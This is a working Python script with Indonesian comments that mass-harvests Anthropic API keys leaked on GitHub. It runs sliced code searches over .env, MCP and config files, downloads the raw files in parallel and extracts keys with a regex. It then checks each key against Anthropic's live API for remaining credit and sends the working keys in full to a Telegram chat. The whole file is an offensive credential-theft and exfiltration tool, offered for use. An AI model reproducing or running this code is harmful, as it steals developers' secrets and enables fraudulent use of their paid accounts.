#!/usr/bin/env python3
"""
Ciro Operation Anthropic Dredger (Deep Slicing Engine)
=====================================================
Menyapu habis 44.000+ kolam Anthropic Claude API Key di GitHub
menggunakan teknik irisan mendalam (path, size, language, config)
untuk menembus batas limit 1.000 hasil pencarian GitHub.
- Menyedot isi mentah file secara paralel (30 worker)
- Validasi live langsung ke endpoint resmi Anthropic Messages API
- Terintegrasi otomatis ke Telegram Vault & State Branch (Zero Duplicate)
"""

import os
import sys
import json
import re
import time
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

GH_PATS_RAW = os.getenv("GH_PAT", "")
GH_PATS = [p.strip() for p in GH_PATS_RAW.split(",") if p.strip()]
if not GH_PATS:
    for env_k in ["GH_PAT_1", "GH_PAT_2", "GH_PAT_3"]:
        val = os.getenv(env_k, "").strip()
        if val:
            GH_PATS.append(val)

_pat_index = 0
def get_next_gh_token():
    global _pat_index
    if not GH_PATS:
        return ""
    tok = GH_PATS[_pat_index % len(GH_PATS)]
    _pat_index += 1
    return tok

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "1936436999")

CLAUDE_REGEX = re.compile(r"sk-ant-(?:api03|oat01)-[a-zA-Z0-9_\-]{40,110}")

def send_telegram(text):
    if not TELEGRAM_BOT_TOKEN:
        print("[Telegram]", text)
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = json.dumps({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

def send_telegram_doc(filename, caption=""):
    if not TELEGRAM_BOT_TOKEN or not os.path.exists(filename):
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    boundary = "----CiroBoundary" + str(int(time.time()))
    body = []
    body.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{TELEGRAM_CHAT_ID}\r\n")
    if caption:
        body.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n")
    with open(filename, "rb") as f:
        file_bytes = f.read()
    body.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{os.path.basename(filename)}\"\r\nContent-Type: application/json\r\n\r\n")
    full_body = "".join(body).encode("utf-8") + file_bytes + f"\r\n--{boundary}--\r\n".encode("utf-8")
    req = urllib.request.Request(url, data=full_body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    try:
        urllib.request.urlopen(req, timeout=30)
        print(f"✅ Terkirim ke Telegram: {filename}")
    except Exception as e:
        print(f"Send doc error: {e}")

def gh_search(query, page=1):
    url = f"https://api.github.com/search/code?q={urllib.parse.quote(query)}&per_page=100&page={page}"
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "CiroClaudeDredger-v1"
    }
    tok = get_next_gh_token()
    if tok:
        headers["Authorization"] = f"Bearer {tok}"
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
            return data.get("items", []), data.get("total_count", 0)
    except urllib.error.HTTPError as e:
        if e.code in (403, 429):
            time.sleep(15)
        return [], 0
    except Exception as e:
        return [], 0

def fetch_raw_content(item):
    repo = item.get("repository", {}).get("full_name")
    path = item.get("path")
    if not repo or not path:
        return None, None
    default_branch = item.get("repository", {}).get("default_branch", "main")
    raw_url = f"https://raw.githubusercontent.com/{repo}/{default_branch}/{path}"
    headers = {"User-Agent": "Mozilla/5.0"}
    tok = get_next_gh_token()
    if tok:
        headers["Authorization"] = f"token {tok}"
    try:
        req = urllib.request.Request(raw_url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            return f"{repo}/{path}", resp.read().decode("utf-8", errors="ignore")
    except Exception:
        return None, None

def validate_claude_live(key):
    url = "https://api.anthropic.com/v1/messages"
    payload = json.dumps({
        "model": "claude-3-haiku-20240307",
        "max_tokens": 1,
        "messages": [{"role": "user", "content": "hi"}]
    }).encode("utf-8")
    req = urllib.request.Request(url, data=payload, headers={
        "x-api-key": key,
        "anthropic-version": "2023-06-01",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    })
    try:
        with urllib.request.urlopen(req, timeout=6) as resp:
            if resp.status == 200:
                return True, "Aktif & Berisi Saldo (Anthropic Messages 200 OK)"
    except urllib.error.HTTPError as e:
        if e.code == 429:
            return True, "Aktif (Rate Limit / Terpakai)"
        elif e.code == 400:
            err_body = e.read().decode(errors="ignore")
            if "credit balance is too low" in err_body or "balance" in err_body:
                return False, "Saldo $0 / Habis (Anthropic 400)"
            return False, f"HTTP 400: {err_body[:60]}"
        elif e.code == 401:
            return False, "Token Revoked / Invalid (401)"
        return False, f"HTTP {e.code}"
    except Exception as e:
        return False, str(e)
    return False, "Failed"

def load_vault():
    vault_file = "claude_vault.json"
    if os.path.exists(vault_file):
        try:
            with open(vault_file, "r") as f:
                data = json.load(f)
                return set(x.get("token") for x in data if "token" in x), data
        except Exception:
            pass
    return set(), []

def save_vault(new_gold):
    vault_file = "claude_vault.json"
    _, existing = load_vault()
    existing_tokens = set(x.get("token") for x in existing)
    for g in new_gold:
        if g.get("token") not in existing_tokens:
            existing.append(g)
            existing_tokens.add(g.get("token"))
    with open(vault_file, "w") as f:
        json.dump(existing, f, indent=2)

def main():
    slices = [
        # Irisan Ekstensi & Nama File Kunci
        "filename:.env ANTHROPIC_API_KEY sk-ant",
        "filename:.env CLAUDE_API_KEY sk-ant",
        "filename:.env.local ANTHROPIC_API_KEY sk-ant",
        "filename:.env.development ANTHROPIC_API_KEY sk-ant",
        "filename:.env.production ANTHROPIC_API_KEY sk-ant",
        "filename:cline_mcp_settings.json ANTHROPIC_API_KEY",
        "filename:mcp.json ANTHROPIC_API_KEY",
        "filename:.aider.conf.yml ANTHROPIC_API_KEY",
        "filename:config.json ANTHROPIC_API_KEY sk-ant",
        
        # Irisan Berdasarkan Ukuran File (Tembus batas 1000)
        "filename:.env ANTHROPIC_API_KEY size:<150",
        "filename:.env ANTHROPIC_API_KEY size:150..400",
        "filename:.env ANTHROPIC_API_KEY size:400..800",
        "filename:.env ANTHROPIC_API_KEY size:800..1500",
        "filename:.env ANTHROPIC_API_KEY size:1500..3000",
        "filename:.env ANTHROPIC_API_KEY size:>3000",
        
        # Irisan Path Proyek Developer
        "path:server ANTHROPIC_API_KEY sk-ant",
        "path:backend ANTHROPIC_API_KEY sk-ant",
        "path:src ANTHROPIC_API_KEY sk-ant",
        "path:api ANTHROPIC_API_KEY sk-ant",
        "path:app ANTHROPIC_API_KEY sk-ant",
        
        # Irisan Bahasa Pemrograman
        "language:Python ANTHROPIC_API_KEY sk-ant",
        "language:TypeScript ANTHROPIC_API_KEY sk-ant",
        "language:JavaScript ANTHROPIC_API_KEY sk-ant",
        "language:YAML ANTHROPIC_API_KEY sk-ant",
        "language:JSON ANTHROPIC_API_KEY sk-ant",
    ]

    print("🦅 OPERASI BEDOL DESA ANTHROPIC CLAUDE DIMULAI...")
    send_telegram(
        "🦅 <b>OPERASI KURAS KOLAM ANTHROPIC CLAUDE DIMULAI!</b>\n\n"
        f"🎯 <b>Target:</b> Menguras 44.000+ kolam Anthropic via 24 Irisan (Deep Slicing)\n"
        "⚡ <b>Engine:</b> Raw HTTP Streamer (30 Worker)\n"
        "⏳ <i>Menyedot & memvalidasi token live...</i>"
    )

    all_raw_targets = []
    seen_files = set()

    for idx, q in enumerate(slices, 1):
        print(f"📡 [{idx}/{len(slices)}] Irisan: {q}...")
        for p in range(1, 11): # Tarik hingga 10 halaman (1.000 file per irisan!)
            items, total = gh_search(q, page=p)
            if not items:
                break
            added = 0
            for it in items:
                f_key = f"{it.get('repository',{}).get('full_name')}:{it.get('path')}"
                if f_key not in seen_files:
                    seen_files.add(f_key)
                    all_raw_targets.append(it)
                    added += 1
            print(f"   • Halaman {p}: dapat {len(items)} file (+{added} unik) | Pool: {total}")
            if len(items) < 100:
                break
            time.sleep(2)

    print(f"📦 Total target terkumpul: {len(all_raw_targets)} file mentah unik.")

    # Sedot isi file secara masif
    print("⚡ Menyedot isi file .env mentah secara paralel (30 worker)...")
    downloaded_files = {}
    with ThreadPoolExecutor(max_workers=30) as executor:
        futs = {executor.submit(fetch_raw_content, it): it for it in all_raw_targets}
        for fut in as_completed(futs):
            src, text = fut.result()
            if src and text:
                downloaded_files[src] = text

    print(f"📥 Berhasil menyedot {len(downloaded_files)} file mentah!")

    # Ekstraksi Token Claude Unik
    known_vault_tokens, _ = load_vault()
    extracted_tokens = []
    seen_tokens = set(known_vault_tokens)

    for src, text in downloaded_files.items():
        matches = CLAUDE_REGEX.findall(text)
        for m in matches:
            if any(x in m.lower() for x in ["example", "your_key", "xxxx", "dummy", "placeholder", "changeme"]):
                continue
            if m not in seen_tokens:
                seen_tokens.add(m)
                extracted_tokens.append((m, src))

    print(f"🎯 Ditemukan {len(extracted_tokens)} kandidat kunci Claude unik baru!")

    # Validasi Live ke Anthropic
    print("🧪 Memvalidasi status live kunci Claude langsung ke Anthropic API...")
    active_gold = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        val_futs = {executor.submit(validate_claude_live, tok): (tok, src) for tok, src in extracted_tokens}
        for fut in as_completed(val_futs):
            tok, src = val_futs[fut]
            is_active, msg = fut.result()
            print(f"   [Claude] {tok[:15]}... -> {'🟢 ' + msg if is_active else '🔴 ' + msg} ({src})")
            if is_active:
                active_gold.append({
                    "provider": "Anthropic Claude",
                    "token": tok,
                    "source": src,
                    "status": msg
                })

    print(f"\n🏆 SELESAI! Ditemukan {len(active_gold)} KUNCI EMAS CLAUDE AKTIF!")

    if active_gold:
        save_vault(active_gold)

    report_file = "findings_claude_gold.json"
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(active_gold, f, indent=2)

    msg_lines = [
        "🏆 <b>LAPORAN HASIL KURAS KOLAM ANTHROPIC CLAUDE</b>",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"📦 <b>File Disedot:</b> {len(downloaded_files)} file",
        f"🔍 <b>Kandidat Unik:</b> {len(extracted_tokens)} token",
        f"💎 <b>KUNCI CLAUDE AKTIF:</b> <b>{len(active_gold)} KUNCI</b>\n"
    ]

    if active_gold:
        for i, g in enumerate(active_gold[:15], 1):
            red = g['token'][:14] + "..." + g['token'][-6:]
            msg_lines.append(f"{i}. <b>[{g['provider']}]</b> {g['status']}\n   👉 <code>{red}</code>\n   📁 <i>{g['source']}</i>")
        if len(active_gold) > 15:
            msg_lines.append(f"\n<i>...dan {len(active_gold) - 15} token lainnya ada di file terlampir!</i>")
        send_telegram("\n".join(msg_lines))
        send_telegram_doc(report_file, f"💎 Kunci Emas Anthropic Claude ({len(active_gold)} Kunci Baru)")
    else:
        msg_lines.append("<i>Semua kunci Claude di batch irisan ini berstatus habis/revoked.</i>")
        send_telegram("\n".join(msg_lines))

if __name__ == "__main__":
    main()
